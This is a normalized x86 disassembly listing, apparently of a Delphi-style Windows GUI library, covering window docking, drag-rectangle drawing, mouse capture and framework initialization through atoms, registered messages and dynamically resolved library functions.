mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451c40
call sub_4534f0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_451670
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_451b68
mov edx eax
mov eax ebx
call sub_451b90
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_451b90
jmp r-xdata
sub_453578
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_4534f0
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_4535bc
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_451b68
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_451b90
sub_4535ec
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_44f7d8
mov edx eax
mov eax [ rw-data ]
call sub_454158
mov eax [ ebx + 0x14 ]
call sub_44f7d8
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_453700
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_45364c
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_454158
mov eax ebx
call sub_453700
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_451b90
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_451b90
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_453578
push ebx
push sub_4536f0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_451f1c
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_4536c8
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_44e274
test eax eax
jle r-xdata
push ebx
push sub_4536f0
xor edx edx
mov eax ebx
call sub_451f1c
sub_453700
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_451734
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_451734
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_4517a0
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_4517a0
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_424a6c
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_4537ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4537ec
pop ecx
mov eax ebx
call sub_451b68
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_451b68
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4537ec
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_451b68
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42ba60
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_45387c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_451b68
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4516ec
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_451b68
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_4537ec
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4538cc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_44894c
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44894c
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_453948
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4515f8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_4516a4
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_451c4c
test eax eax
je r-xdata
mov eax esi
call sub_451670
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_4536f0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_451f1c
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_451c4c
mov edx [ ebx + 0x20 ]
call sub_451ba4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_453948
pop ecx
sub_4539c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_451654
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_451654
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_451c4c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_4539c8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_4536f0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_451f1c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_451850
mov eax edi
call sub_451c40
test eax eax
je r-xdata
mov eax edi
call sub_451c4c
mov esi eax
mov eax esi
call sub_451b68
push eax
mov eax esi
call sub_4516a4
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_451c40
call sub_451b68
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_451b68
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_451b90
mov eax esi
call sub_451b68
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_451b90
mov eax edi
call sub_451c4c
call sub_451be0
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_4516a4
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_451b90
mov eax edi
call sub_451c40
call sub_451be0
mov bl 0x1
jmp r-xdata
sub_453b00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_451eb4
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_417088
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4526a8
test eax eax
je r-xdata
push ebp
call sub_453948
pop ecx
push ebp
call sub_4539c8
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_4538cc
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_453b88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_451734
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_451734
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_45387c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_45387c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_453c18
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_453ff0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406b7c
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4526a8
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45364c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b7c
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4526a8
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_448af0
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453ff7
lea eax [ ebp - 0x48 ]
call sub_403eb8
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44f7d8
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_4477e4
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_449ce4
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403eb8
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_453b00
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44e308
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_453700
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406b7c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_453b88
pop ecx
mov eax [ ebp - 0x4 ]
call sub_453700
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b7c
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4526a8
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_448ecc
jmp r-xdata
mov eax edi
call sub_465de4
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4526a8
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_44894c
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_448fac
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f0c
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4535ec
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46752c
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44f7d8
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_44968c
jmp r-xdata
sub_454000
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_454180
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_454090
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_454158
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_454100
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_454130
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406c68
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_454158
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4540c0
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_454180
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_4540e4
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_454100
pop ebx
retn
mov eax ebx
call sub_454130
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_4541e4
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45434a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_454468
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_45444c
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_45444c
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_454558
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403128
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403128
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403128
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403128
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403eb8
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403eb8
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4545e0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454758
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408f48
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403f0c
mov eax [ rw-data ]
call sub_404378
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408f48
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f0c
mov eax [ rw-data ]
call sub_404378
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_404378
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41896c
mov [ rw-data ] eax
call sub_4541e4
mov dl 0x1
mov eax [ r-xdata ]
call sub_454000
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_466dc0
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_467f48
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_469b30
mov ecx r-xdata
mov edx sub_44603c
mov eax [ r-xdata ]
call sub_417ec0
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45475f
lea eax [ ebp - 0x10 ]
call sub_403eb8
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4547c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_454827
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45482e
retn
mov eax rw-data
call sub_40d31c
call sub_454558
mov eax rw-data
mov ecx 0x16
